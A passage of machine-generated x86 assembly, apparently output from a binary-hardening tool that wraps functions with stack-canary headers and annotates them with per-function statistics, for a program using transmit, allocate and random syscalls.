   mov     0x24(%esp), %eax                   # [2(989)]   #32
   mov     0x28(%esp), %ecx                   # [3(990)]   #32
   mov     Var_0x80602a8, %edx                # [4(991)]   #32
   mov     %ecx, 0x8(%esp)                    # [5(992)]   #32
   mov     %eax, 0x4(%esp)                    # [6(993)]   #32
   mov     %edx, (%esp)                       # [7(994)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048f0d
   .long    Func_0x8048290  #pp1w: Label_0x8048290 VAR_ADDRESS #32
   xor     %esi, %esi                         # [9(996)]   #32
   test    %eax, %eax                         # [10(997)]   #32
   je      Label_0x8048f4f #32
   cmpl    $0x0, 0x8(%eax)                    # [12(999)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x8048f4f #32
   movl    $0x0, 0x8(%eax)                    # [14(1001)]Using Pointer PTRCHECK arg[1]  Already checked [12]   #32
   cmpl    $0x0, 0xc(%eax)                    # [15(1002)]Using Pointer PTRCHECK arg[1]    #32
   mov     $0x64, %esi                        # [16(1003)]# FLAGS USED   #32
   jne     Label_0x8048f4f #32
   mov     Var_0x80602a8, %ecx                # [18(1005)]   #32
   movsd   (%eax), %xmm0                      # [19(1006)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%eax), %xmm1                   # [20(1007)]Using Pointer PTRCHECK arg[0]  Already checked [14]   #32
   movsd   %xmm1, 0x8(%esp)                   # [21(1008)]   #32
   movsd   %xmm0, (%esp)                      # [22(1009)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048f4a
   .long    Func_0x8048310  #pp1w: Label_0x8048310 VAR_ADDRESS #32
Label_0x8048f4f: #p6a
   mov     %esi, %eax                         # [24(1011)]   #32
   add     $0x18, %esp                        # [25(1012)]stackSize = 0x4   #32
   pop     %esi                               # [26(1013)]stackSize = 0x0   #32
Label_0x8048f55: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:83 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 53
     adding function wrapper

;     Start Index : 2871 (0x804aa80)
;       End Index : 2961 (0x804abaa)
;   Num Instructs : 91
;      Stack Size : 60 (0x3c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 3
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 5
;      Local Vars : 0
;      ESP Others : 15
;     ESP Offsets : 20
;                 :  0x0(0x3c), 0x4(0x38), 0x8(0x34), 0xc(0x30),
;                 :  0x10(0x2c), 0x14(0x28), 0x18(0x24), 0x1f(0x1d),
;                 :  0x20(0x1c), 0x27(0x15), 0x28(0x14), 0x2f(0xd),
;                 :  0x30(0xc), 0x37(0x5), 0x38(0x4),
;      ESP Params : 
;                 :  0x50(0x4), 0x54(0x4), 0x58(0x4), 0x5c(0x4),
;                 :  0x60(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; Calls syscall transmit

;
;-------------------------*/

.p2align 4,0x6520,7
.p2align 3,0x6525
FuncPtr_0x804aa80:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804aa80,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804aa80:

Label_0x804aa80:
   push    %ebp                               # [0(2871)]stackSize = 0x4   #32
   push    %ebx                               # [1(2872)]stackSize = 0x8   #32
   push    %edi                               # [2(2873)]stackSize = 0xc   #32
   push    %esi                               # [3(2874)]stackSize = 0x10   #32
   sub     $0x3c, %esp                        # [4(2875)]stackSize = 0x4c   #32
   xor     %eax, %eax                         # [5(2876)]   #32
   mov     0x64(%esp), %edi                   # [6(2877)]   #32
   mov     0x60(%esp), %ebp                   # [7(2878)]   #32
   mov     0x5c(%esp), %ecx                   # [8(2879)]   #32
   mov     0x58(%esp), %esi                   # [9(2880)]   #32
   mov     0x54(%esp), %ebx                   # [10(2881)]   #32
   cmp     %ecx, %esi                         # [11(2882)]   #32
   jae     Label_0x804aaa9 #32
   mov     %esi, 0x14(%esp)                   # [13(2884)]   #32
   mov     %ebx, %esi                         # [14(2885)]   #32
   jmp     Label_0x804aad0 #32
Label_0x804aaa9: #p6a
   xor     %edx, %edx                         # [16(2887)]   #32
   mov     %esi, %eax                         # [17(2888)]   #32
   div     %ecx                               # [18(2889)]   #32
   lea     -0x1(%ebp), %esi                   # [19(2890)] Loading Pointer with stackSize: 76   #32
   mov     %edx, 0x14(%esp)                   # [20(2891)]   #32
   mov     %edi, 0x10(%esp)                   # [21(2892)]   #32
   mov     %esi, 0xc(%esp)                    # [22(2893)]   #32
   mov     %ecx, 0x8(%esp)                    # [23(2894)]   #32
   mov     %eax, 0x4(%esp)                    # [24(2895)]   #32
   mov     %ebx, (%esp)                       # [25(2896)]   #32
   mov     %ebx, %esi                         # [26(2897)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804aacb
   .long    Func_0x804aa80  #pp1w: Label_0x804aa80 VAR_ADDRESS #32
Label_0x804aad0: #p6a
   mov     %eax, 0x18(%esp)                   # [28(2899)]   #32
   test    %eax, %eax                         # [29(2900)]   #32
   mov     %edi, %ecx                         # [30(2901)]# FLAGS USED   #32
   jne     Label_0x804ab4a #32
   test    %ebp, %ebp                         # [32(2903)]   #32
   jle     Label_0x804ab4a #32
   cmp     $0x1, %ebp                         # [34(2905)]   #32
   je      Label_0x804ab4a #32
   mov     %ebp, %eax                         # [36(2907)]   #32
   mov     %ecx, %ebp                         # [37(2908)]   #32
   and     $0x1, %ebp                         # [38(2909)]   #32
   mov     $0x1, %ebx                         # [39(2910)]   #32
   sub     %eax, %ebx                         # [40(2911)]   #32
Label_0x804ab00: #p6a
   mov     %ecx, %edi                         # [41(2912)]   #32
   test    %ebp, %ebp                         # [42(2913)]   #32
   jne     Label_0x804ab20 #32
   movb    $0x20, 0x2f(%esp)                  # [44(2915)]   #32
   lea     0x30(%esp), %eax                   # [45(2916)] Loading Pointer with stackSize: 76   #32
   mov     %eax, 0xc(%esp)                    # [46(2917)]   #32
   lea     0x2f(%esp), %eax                   # [47(2918)] Loading Pointer with stackSize: 76   #32
   jmp     Label_0x804ab31 #32
Label_0x804ab20: #p6a
   movb    $0x30, 0x37(%esp)                  # [49(2920)]   #32
   lea     0x38(%esp), %eax                   # [50(2921)] Loading Pointer with stackSize: 76   #32
   mov     %eax, 0xc(%esp)                    # [51(2922)]   #32
   lea     0x37(%esp), %eax                   # [52(2923)] Loading Pointer with stackSize: 76   #32
Label_0x804ab31: #p6a
   mov     %eax, 0x4(%esp)                    # [53(2924)]   #32
   mov     %esi, (%esp)                       # [54(2925)]   #32
   movl    $0x1, 0x8(%esp)                    # [55(2926)]   #32
   call    _transmit                          # [56(2927)]  System Call to transmit() #32
   add     $0x1, %ebx                         # [57(2928)]# FLAGS USED   #32
   mov     %edi, %ecx                         # [58(2929)]# FLAGS USED   #32
   jne     Label_0x804ab00 #32
Label_0x804ab4a: #p6a
   mov     0x14(%esp), %edx                   # [60(2931)]   #32
   lea     0x30(%edx), %eax                   # [61(2932)] Loading Pointer with stackSize: 76   #32
   test    $0x2, %cl                          # [62(2933)]   #32
   je      Label_0x804ab71 #32
   cmp     $0xa, %edx                         # [64(2935)]   #32
   lea     0x37(%edx), %ecx                   # [65(2936)] Loading Pointer with stackSize: 76# FLAGS USED   #32
   cmovb   %eax, %ecx                         # [66(2937)]   #32
   mov     %cl, 0x27(%esp)                    # [67(2938)]   #32
   lea     0x28(%esp), %eax                   # [68(2939)] Loading Pointer with stackSize: 76   #32
   mov     %eax, 0xc(%esp)                    # [69(2940)]   #32
   lea     0x27(%esp), %eax                   # [70(2941)] Loading Pointer with stackSize: 76   #32
   jmp     Label_0x804ab8a #32
Label_0x804ab71: #p6a
   cmp     $0xa, %edx                         # [72(2943)]   #32
   lea     0x57(%edx), %ecx                   # [73(2944)] Loading Pointer with stackSize: 76# FLAGS USED   #32
   cmovb   %eax, %ecx                         # [74(2945)]   #32
   mov     %cl, 0x1f(%esp)                    # [75(2946)]   #32
   lea     0x20(%esp), %eax                   # [76(2947)] Loading Pointer with stackSize: 76   #32
   mov     %eax, 0xc(%esp)                    # [77(2948)]   #32
   lea     0x1f(%esp), %eax                   # [78(2949)] Loading Pointer with stackSize: 76   #32
Label_0x804ab8a: #p6a
   mov     %eax, 0x4(%esp)                    # [79(2950)]   #32
   mov     %esi, (%esp)                       # [80(2951)]   #32
   movl    $0x1, 0x8(%esp)                    # [81(2952)]   #32
   call    _transmit                          # [82(2953)]  System Call to transmit() #32
   mov     0x18(%esp), %eax                   # [83(2954)]   #32
   add     $0x1, %eax                         # [84(2955)]   #32
   add     $0x3c, %esp                        # [85(2956)]stackSize = 0x10   #32
   pop     %esi                               # [86(2957)]stackSize = 0xc   #32
   pop     %edi                               # [87(2958)]stackSize = 0x8   #32
   pop     %ebx                               # [88(2959)]stackSize = 0x4   #32
   pop     %ebp                               # [89(2960)]stackSize = 0x0   #32
Label_0x804abaa: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:53 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 81   [[ SAFE FUNCTION ]]: fdwait
     adding function wrapper

;     Start Index : 3857 (0x804b613)
;       End Index : 3874 (0x804b638)
;   Num Instructs : 18
;      Stack Size : 0 (0x0)
;          Pushes : 5 (0x5)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 5
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 5
;      ESP Params : 
;                 :  0x18(0x4), 0x1c(0x4), 0x20(0x4), 0x24(0x4),
;                 :  0x28(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x3120,7
.p2align 3,0x3125
FuncPtr_0x804b613:

Func_0x804b613:

_fdwait:

Label_0x804b613:
   mov     $0x4, %eax                         # [0(3857)]   #32
   push    %ebx                               # [1(3858)]stackSize = 0x4   #32
   push    %ecx                               # [2(3859)]stackSize = 0x8   #32
   push    %edx                               # [3(3860)]stackSize = 0xc   #32
   push    %esi                               # [4(3861)]stackSize = 0x10   #32
   push    %edi                               # [5(3862)]stackSize = 0x14   #32
   mov     0x18(%esp), %ebx                   # [6(3863)]   #32
   mov     0x1c(%esp), %ecx                   # [7(3864)]   #32
   mov     0x20(%esp), %edx                   # [8(3865)]   #32
   mov     0x24(%esp), %esi                   # [9(3866)]   #32
   mov     0x28(%esp), %edi                   # [10(3867)]   #32
   int     $0x80                              # [11(3868)]   #32
   pop     %edi                               # [12(3869)]stackSize = 0x10   #32
   pop     %esi                               # [13(3870)]stackSize = 0xc   #32
   pop     %edx                               # [14(3871)]stackSize = 0x8   #32
   pop     %ecx                               # [15(3872)]stackSize = 0x4   #32
   pop     %ebx                               # [16(3873)]stackSize = 0x0   #32
Label_0x804b638: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:81 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 64   [[ SAFE FUNCTION ]]: allocate
     adding function wrapper

;     Start Index : 3875 (0x804b639)
;       End Index : 3886 (0x804b652)
;   Num Instructs : 12
;      Stack Size : 0 (0x0)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 3
;      ESP Params : 
;                 :  0x10(0x4), 0x14(0x4), 0x18(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x8920,7
.p2align 3,0x8925
FuncPtr_0x804b639:

Func_0x804b639:

_allocate:

Label_0x804b639:
   mov     $0x5, %eax                         # [0(3875)]   #32
   push    %ebx                               # [1(3876)]stackSize = 0x4   #32
   push    %ecx                               # [2(3877)]stackSize = 0x8   #32
   push    %edx                               # [3(3878)]stackSize = 0xc   #32
   mov     0x10(%esp), %ebx                   # [4(3879)]   #32
   mov     0x14(%esp), %ecx                   # [5(3880)]   #32
   mov     0x18(%esp), %edx                   # [6(3881)]   #32
   int     $0x80                              # [7(3882)]   #32
   pop     %edx                               # [8(3883)]stackSize = 0x8   #32
   pop     %ecx                               # [9(3884)]stackSize = 0x4   #32
   pop     %ebx                               # [10(3885)]stackSize = 0x0   #32
Label_0x804b652: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:64 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 87
     adding function wrapper

;     Start Index : 3339 (0x804b0e0)
;       End Index : 3379 (0x804b14c)
;   Num Instructs : 41
;      Stack Size : 16 (0x10)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 5
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 3
;     ESP Offsets : 5
;                 :  0x0(0x10), 0x4(0xc), 0x8(0x8),
;      ESP Params : 
;                 :  0x20(0x4), 0x24(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6520,7
.p2align 3,0x6525
FuncPtr_0x804b0e0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804b0e0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804b0e0:

Label_0x804b0e0:
   push    %ebx                               # [0(3339)]stackSize = 0x4   #32
   push    %edi                               # [1(3340)]stackSize = 0x8   #32
   push    %esi                               # [2(3341)]stackSize = 0xc   #32
   sub     $0x10, %esp                        # [3(3342)]stackSize = 0x1c   #32
   mov     0x28(%esp), %ebx                   # [4(3343)]   #32
   mov     0x24(%esp), %edi                   # [5(3344)]   #32
   test    %edi, %edi                         # [6(3345)]   #32
   je      Label_0x804b116 #32
   test    %ebx, %ebx                         # [8(3347)]   #32
   je      Label_0x804b120 #32
   mov     %ebx, (%esp)                       # [10(3349)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b0f9
   .long    Func_0x804a560  #pp1w: Label_0x804a560 VAR_ADDRESS #32
   mov     %eax, %esi                         # [12(3351)]   #32
   xor     %eax, %eax                         # [13(3352)]   #32
   test    %esi, %esi                         # [14(3353)]   #32
   je      Label_0x804b146 #32
   mov     -0x18(%edi), %eax                  # [16(3355)] Using pointer with negative offset PTRCHECK arg[0]    #32
   add     $-0x18, %eax                       # [17(3356)]   #32
   cmp     %ebx, %eax                         # [18(3357)]   #32
   jbe     Label_0x804b12c #32
   mov     %ebx, 0x8(%esp)                    # [20(3359)]   #32
   jmp     Label_0x804b130 #32
Label_0x804b116: #p6a
   mov     %ebx, (%esp)                       # [22(3361)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b119
   .long    Func_0x804a560  #pp1w: Label_0x804a560 VAR_ADDRESS #32
   jmp     Label_0x804b146 #32
Label_0x804b120: #p6a
   mov     %edi, (%esp)                       # [25(3364)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b123
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   xor     %eax, %eax                         # [27(3366)]   #32
   jmp     Label_0x804b146 #32
Label_0x804b12c: #p6a
   mov     %eax, 0x8(%esp)                    # [29(3368)]   #32
Label_0x804b130: #p6a
   mov     %edi, 0x4(%esp)                    # [30(3369)]   #32
   mov     %esi, (%esp)                       # [31(3370)]   #32
   call    Func_0x804a9d0  #pp1: Label_0x804a9d0 VAR_ADDRESS #32
   mov     %edi, (%esp)                       # [33(3372)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b13f
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   mov     %esi, %eax                         # [35(3374)]   #32
Label_0x804b146: #p6a
   add     $0x10, %esp                        # [36(3375)]stackSize = 0xc   #32
   pop     %esi                               # [37(3376)]stackSize = 0x8   #32
   pop     %edi                               # [38(3377)]stackSize = 0x4   #32
   pop     %ebx                               # [39(3378)]stackSize = 0x0   #32
Label_0x804b14c: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:87 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 65   [[ SAFE FUNCTION ]]: deallocate
     adding function wrapper

;     Start Index : 3887 (0x804b653)
;       End Index : 3895 (0x804b666)
;   Num Instructs : 9
;      Stack Size : 0 (0x0)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 2
;      ESP Params : 
;                 :  0xc(0x4), 0x10(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5520,7
.p2align 3,0x5525
FuncPtr_0x804b653:

Func_0x804b653:

_deallocate:

Label_0x804b653:
   mov     $0x6, %eax                         # [0(3887)]   #32
   push    %ebx                               # [1(3888)]stackSize = 0x4   #32
   push    %ecx                               # [2(3889)]stackSize = 0x8   #32
   mov     0xc(%esp), %ebx                    # [3(3890)]   #32
   mov     0x10(%esp), %ecx                   # [4(3891)]   #32
   int     $0x80                              # [5(3892)]   #32
   pop     %ecx                               # [6(3893)]stackSize = 0x4   #32
   pop     %ebx                               # [7(3894)]stackSize = 0x0   #32
Label_0x804b666: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:65 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 82   [[ SAFE FUNCTION ]]: random
     adding function wrapper

;     Start Index : 3896 (0x804b667)
;       End Index : 3907 (0x804b680)
;   Num Instructs : 12
;      Stack Size : 0 (0x0)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 3
;      ESP Params : 
;                 :  0x10(0x4), 0x14(0x4), 0x18(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6320,7
.p2align 3,0x6325
FuncPtr_0x804b667:

Func_0x804b667:

_random:

Label_0x804b667:
   mov     $0x7, %eax                         # [0(3896)]   #32
   push    %ebx                               # [1(3897)]stackSize = 0x4   #32
   push    %ecx                               # [2(3898)]stackSize = 0x8   #32
   push    %edx                               # [3(3899)]stackSize = 0xc   #32
   mov     0x10(%esp), %ebx                   # [4(3900)]   #32
   mov     0x14(%esp), %ecx                   # [5(3901)]   #32
   mov     0x18(%esp), %edx                   # [6(3902)]   #32
   int     $0x80                              # [7(3903)]   #32
   pop     %edx                               # [8(3904)]stackSize = 0x8   #32
   pop     %ecx                               # [9(3905)]stackSize = 0x4   #32
   pop     %ebx                               # [10(3906)]stackSize = 0x0   #32
Label_0x804b680: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:82 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 90
     adding function wrapper

;     Start Index : 1015 (0x8048f60)
;       End Index : 1051 (0x8048fe8)
;   Num Instructs : 37
;      Stack Size : 52 (0x34)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 2
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 8
;     ESP Offsets : 10
;                 :  0x0(0x34), 0x4(0x30), 0x8(0x2c), 0xc(0x28),
;                 :  0x20(0x14), 0x24(0x10), 0x28(0xc), 0x2c(0x8),
;      ESP Params : 
;                 :  0x40(0x4), 0x44(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 1
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x2220,7
.p2align 3,0x2225
FuncPtr_0x8048f60:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048f60,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048f60:

Label_0x8048f60:
   push    %edi                               # [0(1015)]stackSize = 0x4   #32
   push    %esi                               # [1(1016)]stackSize = 0x8   #32
   sub     $0x34, %esp                        # [2(1017)]stackSize = 0x3c   #32
   mov     0x48(%esp), %esi                   # [3(1018)]   #32
   mov     0x44(%esp), %edi                   # [4(1019)]   #32
   mov     Var_0x80602a8, %eax                # [5(1020)]   #32
   mov     %esi, 0x8(%esp)                    # [6(1021)]   #32
   mov     %edi, 0x4(%esp)                    # [7(1022)]   #32
   mov     %eax, (%esp)                       # [8(1023)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048f7d
   .long    Func_0x8048290  #pp1w: Label_0x8048290 VAR_ADDRESS #32
   test    %eax, %eax                         # [10(1025)]   #32
   je      Label_0x8048f9c #32
   xor     %ecx, %ecx                         # [12(1027)]   #32
   cmpl    $0x0, 0xc(%eax)                    # [13(1028)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x8048fe1 #32
   movl    $0xa, 0xc(%eax)                    # [15(1030)]Using Pointer PTRCHECK arg[1]  Already checked [13]   #32
   mov     $0x1, %ecx                         # [16(1031)]   #32
   jmp     Label_0x8048fe1 #32
Label_0x8048f9c: #p6a
   mov     %edi, 0x20(%esp)                   # [18(1033)]   #32
   mov     %esi, 0x24(%esp)                   # [19(1034)]   #32
   movl    $0x0, 0x28(%esp)                   # [20(1035)]   #32
   movl    $0xa, 0x2c(%esp)                   # [21(1036)]   #32
   mov     Var_0x80602a8, %eax                # [22(1037)]   #32
   movsd   0x20(%esp), %xmm0                  # [23(1038)]   #32
   movsd   0x28(%esp), %xmm1                  # [24(1039)]   #32
   movsd   %xmm1, 0xc(%esp)                   # [25(1040)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [26(1041)]   #32
   mov     %eax, (%esp)                       # [27(1042)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048fd4
   .long    Func_0x80489a0  #pp1w: Label_0x80489a0 VAR_ADDRESS #32
   test    %eax, %eax                         # [29(1044)]   #32
   sete    %al                                # [30(1045)]   #32
   movzbl  %al, %ecx                          # [31(1046)]   #32
Label_0x8048fe1: #p6a
   mov     %ecx, %eax                         # [32(1047)]   #32
   add     $0x34, %esp                        # [33(1048)]stackSize = 0x8   #32
   pop     %esi                               # [34(1049)]stackSize = 0x4   #32
   pop     %edi                               # [35(1050)]stackSize = 0x0   #32
Label_0x8048fe8: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:90 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 54
     adding function wrapper

;     Start Index : 2962 (0x804abb0)
;       End Index : 3128 (0x804ae1a)
;   Num Instructs : 167
;      Stack Size : 92 (0x5c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 8
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 20
;     ESP Offsets : 23
;                 :  0x0(0x5c), 0x4(0x58), 0x8(0x54), 0xc(0x50),
;                 :  0x10(0x4c), 0x20(0x3c), 0x27(0x35), 0x28(0x34),
;                 :  0x2f(0x2d), 0x30(0x2c), 0x37(0x25), 0x38(0x24),
;                 :  0x3f(0x1d), 0x40(0x1c), 0x47(0x15), 0x48(0x14),
;                 :  0x4f(0xd), 0x50(0xc), 0x54(0x8), 0x58(0x4),
;      ESP Params : 
;                 :  0x70(0x4), 0x74(0x4), 0x78(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 1
; Checks Required : 0
; MaxLoopPatches : 0
; Calls syscall transmit

;
;-------------------------*/

.p2align 4,0x5920,7
.p2align 3,0x5925
FuncPtr_0x804abb0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804abb0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804abb0:

Label_0x804abb0:
   push    %ebp                               # [0(2962)]stackSize = 0x4   #32
   push    %ebx                               # [1(2963)]stackSize = 0x8   #32
   push    %edi                               # [2(2964)]stackSize = 0xc   #32
   push    %esi                               # [3(2965)]stackSize = 0x10   #32
   sub     $0x5c, %esp                        # [4(2966)]stackSize = 0x6c   #32
   mov     0x78(%esp), %eax                   # [5(2967)]   #32
   mov     %eax, 0x58(%esp)                   # [6(2968)]   #32
   lea     0x7c(%esp), %eax                   # [7(2969)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0x54(%esp)                   # [8(2970)]   #32
   mov     0x58(%esp), %eax                   # [9(2971)]   #32
   cmpb    $0x0, (%eax)                       # [10(2972)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x804ae11 #32
   mov     0x74(%esp), %edi                   # [12(2974)]   #32
   lea     0x27(%esp), %ebp                   # [13(2975)] Loading Pointer with stackSize: 108   #32
Label_0x804abe0: #p6a
   lea     0x1(%eax), %ecx                    # [14(2976)] Loading Pointer with stackSize: 108   #32
   mov     %ecx, 0x58(%esp)                   # [15(2977)]   #32
   mov     (%eax), %al                        # [16(2978)]Using Pointer PTRCHECK arg[0]  Already checked [158, 10]   #32
   xor     %ebx, %ebx                         # [17(2979)]   #32
   cmp     $0x25, %al                         # [18(2980)]   #32
   mov     $0x0, %esi                         # [19(2981)]# FLAGS USED   #32
   je      Label_0x804ac2f #32
   mov     %al, 0x27(%esp)                    # [21(2983)]   #32
   lea     0x28(%esp), %eax                   # [22(2984)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0xc(%esp)                    # [23(2985)]   #32
   mov     %ebp, 0x4(%esp)                    # [24(2986)]   #32
   jmp     Label_0x804adf4 #32
Label_0x804ac10: #p6a
   mov     0x58(%esp), %eax                   # [26(2988)]   #32
   sub     $0x1, %eax                         # [27(2989)]   #32
   lea     0x58(%esp), %ecx                   # [28(2990)] Loading Pointer with stackSize: 108   #32
   mov     %ecx, 0x4(%esp)                    # [29(2991)]   #32
   mov     %eax, (%esp)                       # [30(2992)]   #32
   movl    $0xa, 0x8(%esp)                    # [31(2993)]   #32
   call    Func_0x804b470  #pp1: Label_0x804b470 VAR_ADDRESS #32
   mov     %eax, %esi                         # [33(2995)]   #32
Label_0x804ac2f: #p6a
   mov     0x58(%esp), %eax                   # [34(2996)]   #32
   lea     0x1(%eax), %ecx                    # [35(2997)] Loading Pointer with stackSize: 108   #32
   mov     %ecx, 0x58(%esp)                   # [36(2998)]   #32
   mov     (%eax), %al                        # [37(2999)]Using Pointer PTRCHECK arg[0]    #32
   movsbl  %al, %ecx                          # [38(3000)]   #32
   cmp     $0x2f, %ecx                        # [39(3001)]   #32
   jle     Label_0x804ac60 #32
   cmp     $0x57, %ecx                        # [41(3003)]   #32
   jg      Label_0x804ac83 #32
   lea     -0x31(%ecx), %edx                  # [43(3005)] Loading Pointer with stackSize: 108   #32
   cmp     $0x9, %edx                         # [44(3006)]   #32
   jb      Label_0x804ac10 #32
   cmp     $0x30, %ecx                        # [46(3008)]   #32
   jne     Label_0x804ade0 #32
   or      $0x1, %ebx                         # [48(3010)]   #32
   jmp     Label_0x804ac2f #32
Label_0x804ac60: #p6a
   cmp     $0x25, %ecx                        # [50(3012)]   #32
   jne     Label_0x804ade0 #32
   movb    $0x25, 0x4f(%esp)                  # [52(3014)]   #32
   lea     0x50(%esp), %eax                   # [53(3015)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0xc(%esp)                    # [54(3016)]   #32
   lea     0x4f(%esp), %eax                   # [55(3017)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0x4(%esp)                    # [56(3018)]   #32
   jmp     Label_0x804adf4 #32
Label_0x804ac83: #p6a
   cmp     $0x62, %ecx                        # [58(3020)]   #32
   jg      Label_0x804acc2 #32
   cmp     $0x58, %ecx                        # [60(3022)]   #32
   jne     Label_0x804ade0 #32
   or      $0x2, %ebx                         # [62(3024)]   #32
Label_0x804ac94: #p6a
   mov     0x54(%esp), %eax                   # [63(3025)]   #32
   lea     0x4(%eax), %ecx                    # [64(3026)] Loading Pointer with stackSize: 108   #32
   mov     %ecx, 0x54(%esp)                   # [65(3027)]   #32
   mov     (%eax), %eax                       # [66(3028)]Using Pointer PTRCHECK arg[0]    #32
   mov     %ebx, 0x10(%esp)                   # [67(3029)]   #32
   mov     %esi, 0xc(%esp)                    # [68(3030)]   #32
   mov     %eax, 0x4(%esp)                    # [69(3031)]   #32
   mov     %edi, (%esp)                       # [70(3032)]   #32
   movl    $0x10, 0x8(%esp)                   # [71(3033)]   #32
